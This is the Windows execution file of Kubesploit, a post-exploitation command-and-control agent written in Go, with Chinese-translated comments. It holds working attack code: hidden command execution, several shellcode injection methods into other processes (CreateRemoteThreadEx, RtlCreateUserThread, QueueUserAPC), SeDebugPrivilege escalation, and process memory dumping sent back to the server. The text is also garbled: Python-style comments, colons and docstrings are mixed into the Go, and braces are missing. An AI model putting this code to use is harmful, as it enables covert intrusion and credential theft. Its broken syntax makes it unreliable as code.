# `kubesploit\pkg\agent\exec_windows.go`

```
// +build windows

// Kubesploit是一个基于Russel Van Tuyl的Merlin构建的后渗透命令和控制框架。
// 本文件是Kubesploit的一部分。
// 版权所有 2021 CyberArk Software Ltd. 保留所有权利。

// Kubesploit是自由软件：您可以根据GNU通用公共许可证的条款重新分发和/或修改它，无论是许可证的第3版还是以后的版本。

// Kubesploit的分发是希望它对增强组织的安全性有所帮助。
// Kubesploit不得以任何恶意方式使用。
// Kubesploit按原样分发，没有任何保证；包括适销性或特定用途的隐含保证。有关更多详细信息，请参见GNU通用公共许可证。

// 您应该已经收到GNU通用公共许可证的副本。
// 如果没有，请参阅<http://www.gnu.org/licenses/>。

package agent

import (
    // 标准库
    "errors"
    "fmt"
    "io/ioutil"
    "os"
    "os/exec"
    "syscall"
    "unsafe"

    // 子存储库
    "golang.org/x/sys/windows"

    // 第三方库
    "github.com/mattn/go-shellwords"
)

const (
    // MEM_COMMIT是与Windows API调用一起使用的Windows常量
    MEM_COMMIT = 0x1000
    // MEM_RESERVE是与Windows API调用一起使用的Windows常量
    MEM_RESERVE = 0x2000
    // MEM_RELEASE是与Windows API调用一起使用的Windows常量
    MEM_RELEASE = 0x8000
    // PAGE_EXECUTE是与Windows API调用一起使用的Windows常量
    PAGE_EXECUTE = 0x10
    // PAGE_EXECUTE_READWRITE是与Windows API调用一起使用的Windows常量
    PAGE_EXECUTE_READWRITE = 0x40
    // PAGE_READWRITE是与Windows API调用一起使用的Windows常量
    PAGE_READWRITE = 0x04
    // PROCESS_CREATE_THREAD是与Windows API调用一起使用的Windows常量
    PROCESS_CREATE_THREAD = 0x0002
    // PROCESS_VM_READ是与Windows API调用一起使用的Windows常量
    # 定义一个常量，用于在 Windows API 调用中读取进程的虚拟内存
    PROCESS_VM_READ = 0x0010
    # 定义一个常量，用于在 Windows API 调用中写入进程的虚拟内存
    PROCESS_VM_WRITE = 0x0020
    # 定义一个常量，用于在 Windows API 调用中操作进程的虚拟内存
    PROCESS_VM_OPERATION = 0x0008
    # 定义一个常量，用于在 Windows API 调用中查询进程的信息
    PROCESS_QUERY_INFORMATION = 0x0400
    # 定义一个常量，用于在 Windows API 调用中获取进程的堆列表
    TH32CS_SNAPHEAPLIST = 0x00000001
    # 定义一个常量，用于在 Windows API 调用中获取进程的模块列表
    TH32CS_SNAPMODULE = 0x00000008
    # 定义一个常量，用于在 Windows API 调用中获取进程列表
    TH32CS_SNAPPROCESS = 0x00000002
    # 定义一个常量，用于在 Windows API 调用中获取线程列表
    TH32CS_SNAPTHREAD = 0x00000004
    # 定义一个常量，用于在 Windows API 调用中设置线程的上下文
    THREAD_SET_CONTEXT = 0x0010
// ExecuteCommand是用于指示代理在主机操作系统上执行命令的函数
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
    var cmd *exec.Cmd

    // 解析命令行参数
    argS, errS := shellwords.Parse(arg)
    if errS != nil {
        return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
    }

    // 创建执行命令的对象
    cmd = exec.Command(name, argS...)

    // 设置执行命令的系统属性
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //这里和agent.go之间的唯一区别

    // 执行命令并获取输出
    out, err := cmd.CombinedOutput()
    stdout = string(out)
    stderr = ""

    // 处理错误信息
    if err != nil {
        stderr = err.Error()
    }

    return stdout, stderr
}

// ExecuteShellcodeSelf在当前进程中执行提供的shellcode
func ExecuteShellcodeSelf(shellcode []byte) error {

    kernel32 := windows.NewLazySystemDLL("kernel32")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    //VirtualProtect := kernel32.NewProc("VirtualProtectEx")
    RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

    // 分配内存并拷贝shellcode
    addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    // 处理VirtualAlloc调用错误
    if errVirtualAlloc.Error() != "The operation completed successfully." {
        return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
    }

    // 处理VirtualAlloc返回0的情况
    if addr == 0 {
        return errors.New("VirtualAlloc failed and returned 0")
    }

    // 拷贝shellcode到分配的内存中
    _, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    // 处理RtlCopyMemory调用错误
    if errRtlCopyMemory.Error() != "The operation completed successfully." {
        return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
    }
    // TODO 设置初始内存分配为读写，并更新为执行；当前出现"The parameter is incorrect."错误
}
    /*    _, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
        // 调用 VirtualProtect 函数，设置内存页属性为可执行
        if errVirtualProtect.Error() != "The operation completed successfully." {
            // 如果设置内存页属性失败，则返回错误
            return errVirtualProtect
        }*/

    // 调用系统调用执行 shellcode
    _, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

    // 如果系统调用返回错误，则返回错误信息
    if errSyscall != 0 {
        return errors.New("Error executing shellcode syscall:\r\n" + errSyscall.Error())
    }

    // 执行成功，返回空
    return nil
// ExecuteShellcodeRemote 在提供的目标进程中执行提供的 shellcode
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
    // 使用 LazySystemDLL 创建 kernel32 对象
    kernel32 := windows.NewLazySystemDLL("kernel32")

    // 获取 VirtualAllocEx 函数地址
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    // 获取 VirtualProtectEx 函数地址
    VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    // 获取 WriteProcessMemory 函数地址
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    // 获取 CreateRemoteThreadEx 函数地址
    CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
    // 获取 CloseHandle 函数地址
    CloseHandle := kernel32.NewProc("CloseHandle")

    // 打开目标进程，获取进程句柄
    pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

    // 如果打开进程出错，返回错误信息
    if errOpenProcess != nil {
        return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
    }

    // 在目标进程中分配内存
    addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

    // 如果分配内存出错，返回错误信息
    if errVirtualAlloc.Error() != "The operation completed successfully." {
        return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
    }

    // 如果地址为 0，返回错误信息
    if addr == 0 {
        return errors.New("VirtualAllocEx failed and returned 0")
    }

    // 在目标进程中写入 shellcode
    _, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    // 如果写入内存出错，返回错误信息
    if errWriteProcessMemory.Error() != "The operation completed successfully." {
        return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
    }

    // 修改内存权限为可执行
    _, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
    // 如果修改内存权限出错，返回错误信息
    if errVirtualProtectEx.Error() != "The operation completed successfully." {
        return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
    }

    // 在目标进程中创建远程线程执行 shellcode
    _, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
    # 检查创建远程线程的错误信息，如果不是"操作成功完成"，则返回错误信息
    if errCreateRemoteThreadEx.Error() != "The operation completed successfully.":
        return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())

    # 调用CloseHandle函数关闭句柄，并获取错误信息
    _, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
    # 检查关闭句柄的错误信息，如果不是"操作成功完成"，则返回错误信息
    if errCloseHandle.Error() != "The operation completed successfully.":
        return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())

    # 如果以上操作都没有错误，则返回空值
    return nil
// ExecuteShellcodeRtlCreateUserThread 函数执行提供的 shellcode 在提供的目标进程中，使用 Windows 的 RtlCreateUserThread 调用
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
    // 加载 kernel32.dll 和 ntdll.dll 动态链接库
    kernel32 := windows.NewLazySystemDLL("kernel32")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    // 获取所需函数的指针
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CloseHandle := kernel32.NewProc("CloseHandle")
    RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

    // 打开目标进程，获取进程句柄
    pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

    // 检查是否成功打开进程
    if errOpenProcess != nil {
        return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
    }

    // 在目标进程中分配内存空间
    addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

    // 检查内存分配是否成功
    if errVirtualAlloc.Error() != "The operation completed successfully." {
        return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
    }

    // 检查内存地址是否有效
    if addr == 0 {
        return errors.New("VirtualAllocEx failed and returned 0")
    }

    // 将 shellcode 写入目标进程的内存空间
    _, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    // 检查写入内存是否成功
    if errWriteProcessMemory.Error() != "The operation completed successfully." {
        return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
    }

    // 修改内存空间的保护属性，使其可执行
    _, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
    # 检查 VirtualProtectEx 函数调用是否出错，如果出错则返回错误信息
    if errVirtualProtectEx.Error() != "The operation completed successfully.":
        return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())

    """
    NTSTATUS
    RtlCreateUserThread(
        IN HANDLE Process,
        IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
        IN BOOLEAN CreateSuspended,
        IN ULONG ZeroBits OPTIONAL,
        IN SIZE_T MaximumStackSize OPTIONAL,
        IN SIZE_T CommittedStackSize OPTIONAL,
        IN PUSER_THREAD_START_ROUTINE StartAddress,
        IN PVOID Parameter OPTIONAL,
        OUT PHANDLE Thread OPTIONAL,
        OUT PCLIENT_ID ClientId OPTIONAL
        )
    """
    # 调用 RtlCreateUserThread 函数创建用户线程
    var tHandle uintptr
    _, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

    # 检查 RtlCreateUserThread 函数调用是否出错，如果出错则返回错误信息
    if errRtlCreateUserThread.Error() != "The operation completed successfully.":
        return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())

    # 调用 WaitForSingleObject 函数等待单个对象的信号
    _, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
    # 检查 WaitForSingleObject 函数调用是否出错，如果出错则返回错误信息
    if errWaitForSingleObject.Error() != "The operation completed successfully.":
        return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())

    # 调用 CloseHandle 函数关闭一个已打开的对象句柄
    _, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
    # 检查 CloseHandle 函数调用是否出错，如果出错则返回错误信息
    if errCloseHandle.Error() != "The operation completed successfully.":
        return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())

    # 如果以上所有操作都没有出错，则返回空值
    return nil
// ExecuteShellcodeQueueUserAPC函数执行提供的shellcode在提供的目标进程中，使用Windows QueueUserAPC API调用
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
    // TODO 这可以是本地的或远程的
    kernel32 := windows.NewLazySystemDLL("kernel32")

    // 获取VirtualAllocEx、VirtualProtectEx、WriteProcessMemory、CloseHandle、CreateToolhelp32Snapshot、QueueUserAPC、Thread32First、Thread32Next、OpenThread的API调用
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CloseHandle := kernel32.NewProc("CloseHandle")
    CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    QueueUserAPC := kernel32.NewProc("QueueUserAPC")
    Thread32First := kernel32.NewProc("Thread32First")
    Thread32Next := kernel32.NewProc("Thread32Next")
    OpenThread := kernel32.NewProc("OpenThread")

    // 考虑使用NtQuerySystemInformation来替换CreateToolhelp32Snapshot，并找到等待状态的线程
    // https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori

    // 打开目标进程，获取进程句柄
    pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

    if errOpenProcess != nil {
        return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
    }
    // TODO 看看是否可以只使用SNAPTHREAD
    // 创建进程快照，获取快照句柄
    sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
    if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
        return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
    }

    // TODO 只有在有有效线程时才分配/写入内存
    // 在目标进程中分配内存
    addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    # 检查 VirtualAlloc 函数的错误信息，如果不是 "The operation completed successfully."，则返回错误信息
    if errVirtualAlloc.Error() != "The operation completed successfully.":
        return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())

    # 检查分配的内存地址是否为 0，如果是则返回错误信息
    if addr == 0:
        return errors.New("VirtualAllocEx failed and returned 0")

    # 调用 WriteProcessMemory 函数写入 shellcode 到进程内存中
    _, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    # 检查 WriteProcessMemory 函数的错误信息，如果不是 "The operation completed successfully."，则返回错误信息
    if errWriteProcessMemory.Error() != "The operation completed successfully.":
        return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())

    # 调用 VirtualProtectEx 函数设置内存区域的属性为 PAGE_EXECUTE
    _, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
    
    # 检查 VirtualProtectEx 函数的错误信息，如果不是 "The operation completed successfully."，则返回错误信息
    if errVirtualProtectEx.Error() != "The operation completed successfully.":
        return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())

    # 定义 THREADENTRY32 结构体
    type THREADENTRY32 struct {
        dwSize             uint32
        cntUsage           uint32
        th32ThreadID       uint32
        th32OwnerProcessID uint32
        tpBasePri          int32
        tpDeltaPri         int32
        dwFlags            uint32
    }
    # 初始化 THREADENTRY32 结构体的 dwSize 属性
    var t THREADENTRY32
    t.dwSize = uint32(unsafe.Sizeof(t))

    # 调用 Thread32First 函数获取系统中的第一个线程信息
    _, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
    
    # 检查 Thread32First 函数的错误信息，如果不是 "The operation completed successfully."，则返回错误信息
    if errThread32First.Error() != "The operation completed successfully.":
        return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())

    # 设置变量 i 为 true，x 为 0
    i := true
    x := 0
    # 为每个线程排队一个 APC；非常不稳定且不理想，需要以编程方式找到可警报的线程
    # 遍历线程列表
    for i {
        # 调用 Thread32Next 函数获取下一个线程信息
        _, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
        # 如果没有更多的文件，则返回错误
        if errThread32Next.Error() == "There are no more files." {
            # 如果 x 等于 1，则不将任务排队到主线程，因为使用“spray all threads”技术经常导致进程崩溃
            if x == 1 {
                return errors.New("the process only has 1 thread; APC not queued")
            }
            i = false
            break
        } else if errThread32Next.Error() != "The operation completed successfully." {
            return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
        }
        # 如果线程的所有者进程 ID 等于指定的进程 ID
        if t.th32OwnerProcessID == pid {
            # 如果 x 大于 0
            if x > 0 {
                # 调用 OpenThread 函数打开指定线程
                tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
                if errOpenThread.Error() != "The operation completed successfully." {
                    return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
                }
                # 调用 QueueUserAPC 函数将用户模式异步过程调用（APC）排队到指定线程
                _, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
                if errQueueUserAPC.Error() != "The operation completed successfully." {
                    return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
                }
                x++
                # 调用 CloseHandle 函数关闭指定的句柄
                _, _, errCloseHandle := CloseHandle.Call(tHandle)
                if errCloseHandle.Error() != "The operation completed successfully." {
                    return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
                }
            } else {
                x++
            }
        }

    }
    # TODO 检查进程以确保它没有崩溃
    # 调用 CloseHandle 函数关闭指定的句柄
    _, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
    # 如果关闭句柄时发生错误，错误信息不等于"The operation completed successfully."，则返回包含错误信息的新错误对象
    if errCloseHandle.Error() != "The operation completed successfully.":
        return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
    # 如果没有错误发生，返回空值
    return nil
// TODO always close handle during exception handling

// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
// the raw bytes of the dumpfile back as an upload to the server.
// Touches disk during the dump process, in the OS default temporary or provided temporary directory
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
    var mini map[string]interface{}  // 声明一个空的 map 变量 mini
    mini = make(map[string]interface{})  // 初始化 mini 为一个空的 map
    var err error  // 声明一个错误变量 err

    // Make sure temporary directory exists before executing miniDump functionality
    if tempDir != "" {  // 如果临时目录不为空
        d, errS := os.Stat(tempDir)  // 获取临时目录的状态信息
        if os.IsNotExist(errS) {  // 如果临时目录不存在
            return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)  // 返回错误信息
        }
        if d.IsDir() != true {  // 如果临时目录不是一个有效的目录
            return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)  // 返回错误信息
        }
    } else {  // 如果临时目录为空
        tempDir = os.TempDir()  // 使用系统默认临时目录
    }

    // Get the process PID or name
    mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)  // 获取进程的名称和进程ID
    if err != nil {  // 如果有错误发生
        return mini, err  // 返回错误信息
    }

    // Get debug privs (required for dumping processes not owned by current user)
    err = sePrivEnable("SeDebugPrivilege")  // 获取调试权限
    if err != nil {  // 如果有错误发生
        return mini, err  // 返回错误信息
    }

    // Get a handle to process
    hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32))  // 获取进程的句柄
    if err != nil {  // 如果有错误发生
        return mini, err  // 返回错误信息
    }

    // Set up the temporary file to write to, automatically remove it once done
    // TODO: Work out how to do this in memory
    f, tempErr := ioutil.TempFile(tempDir, "*.tmp")  // 在临时目录创建临时文件
    if tempErr != nil {  // 如果有错误发生
        return mini, tempErr  // 返回错误信息
    }

    // Remove the file after the function exits, regardless of error nor not
    defer os.Remove(f.Name())  // 在函数退出时删除临时文件

    // Load MiniDumpWriteDump function from DbgHelp.dll
    k32 := windows.NewLazySystemDLL("DbgHelp.dll")  // 加载 DbgHelp.dll 中的 MiniDumpWriteDump 函数
    // 使用 k32.NewProc 方法创建一个指向 MiniDumpWriteDump 函数的指针
    miniDump := k32.NewProc("MiniDumpWriteDump")

    /*
        BOOL MiniDumpWriteDump(
          HANDLE                            hProcess,
          DWORD                             ProcessId,
          HANDLE                            hFile,
          MINIDUMP_TYPE                     DumpType,
          PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
          PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
          PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
        );
    */
    // 调用 Windows MiniDumpWriteDump API
    r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)

    // 关闭文件
    f.Close() //idk why this fixes the 'not same as on disk' issue, but it does

    // 如果调用 MiniDumpWriteDump 函数返回值不为 0
    if r != 0 {
        // 读取文件内容到 mini["FileContent"] 中
        mini["FileContent"], err = ioutil.ReadFile(f.Name())
        // 如果读取文件内容出错
        if err != nil {
            // 关闭文件并返回错误
            f.Close()
            return mini, err
        }
    }
    // 返回 mini 和 nil
    return mini, nil
// getProcess函数接受进程名或进程ID，并返回指向进程句柄、进程名和进程ID的指针
func getProcess(name string, pid uint32) (string, uint32, error) {
    // 如果进程ID小于等于0且进程名为空，则返回错误
    if pid <= 0 && name == "" {
        return "", 0, fmt.Errorf("必须提供进程名或进程ID")
    }

    // 创建进程快照
    snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshotHandle < 0 || err != nil {
        return "", 0, fmt.Errorf("创建快照时出错:\r\n%s", err)
    }
    defer syscall.CloseHandle(snapshotHandle)

    var process syscall.ProcessEntry32
    process.Size = uint32(unsafe.Sizeof(process))
    err = syscall.Process32First(snapshotHandle, &process)
    if err != nil {
        return "", 0, fmt.Errorf("访问快照中的第一个进程时出错:\r\n%s", err)
    }

    for {
        processName := ""
        // 遍历字符以构建完整字符串
        for _, chr := range process.ExeFile {
            if chr != 0 {
                processName = processName + string(int(chr))
            }
        }
        if pid > 0 {
            if process.ProcessID == pid {
                return processName, pid, nil
            }
        } else if name != "" {
            if processName == name {
                return name, process.ProcessID, nil
            }
        }
        err = syscall.Process32Next(snapshotHandle, &process)
        if err != nil {
            break
        }
    }
    return "", 0, fmt.Errorf("找不到提供的名称为\"%s\"或PID为\"%d\"的进程", name, pid)
}

// sePrivEnable函数调整当前进程的特权以添加传入的字符串。适用于设置'SeDebugPrivilege'
func sePrivEnable(s string) error {
    type LUID struct {
        LowPart  uint32
        HighPart int32
    }
    // 定义结构体 LUID_AND_ATTRIBUTES，包含 LUID 和 Attributes 两个字段
    type LUID_AND_ATTRIBUTES struct {
        Luid       LUID
        Attributes uint32
    }
    // 定义结构体 TOKEN_PRIVILEGES，包含 PrivilegeCount 和 Privileges 两个字段
    type TOKEN_PRIVILEGES struct {
        PrivilegeCount uint32
        Privileges     [1]LUID_AND_ATTRIBUTES
    }

    // 加载 advapi32.dll 动态链接库
    modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
    // 获取 AdjustTokenPrivileges 函数的地址
    procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

    // 获取 LookupPrivilegeValueW 函数的地址
    procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
    // 声明变量 tokenHandle 为 syscall.Token 类型
    var tokenHandle syscall.Token
    // 获取当前进程的句柄
    thsHandle, err := syscall.GetCurrentProcess()
    if err != nil {
        return err
    }
    // 打开当前进程的访问令牌
    syscall.OpenProcessToken(
        thsHandle,                       //  HANDLE  ProcessHandle,
        syscall.TOKEN_ADJUST_PRIVILEGES, //    DWORD   DesiredAccess,
        &tokenHandle,                    //    PHANDLE TokenHandle
    )
    // 声明变量 luid 为 LUID 类型
    var luid LUID
    // 调用 LookupPrivilegeValueW 函数获取特权的 LUID
    r, _, e := procLookupPriv.Call(
        uintptr(0), //LPCWSTR lpSystemName,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
        uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
    )
    // 如果返回值为 0，则表示出错，返回错误信息
    if r == 0 {
        return e
    }
    // 定义常量 SE_PRIVILEGE_ENABLED 为 0x00000002
    SE_PRIVILEGE_ENABLED := uint32(0x00000002)
    // 声明变量 privs 为 TOKEN_PRIVILEGES 类型
    privs := TOKEN_PRIVILEGES{}
    privs.PrivilegeCount = 1
    privs.Privileges[0].Luid = luid
    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    // 调用 AdjustTokenPrivileges 函数，修改访问令牌的特权
    r, _, e = procAdjustTokenPrivileges.Call(
        uintptr(tokenHandle),
        uintptr(0),
        uintptr(unsafe.Pointer(&privs)),
        uintptr(0),
        uintptr(0),
        uintptr(0),
    )
    // 如果返回值为 0，则表示出错，返回错误信息
    if r == 0 {
        return e
    }
    // 返回空值表示成功
    return nil
# 闭合函数定义的大括号
```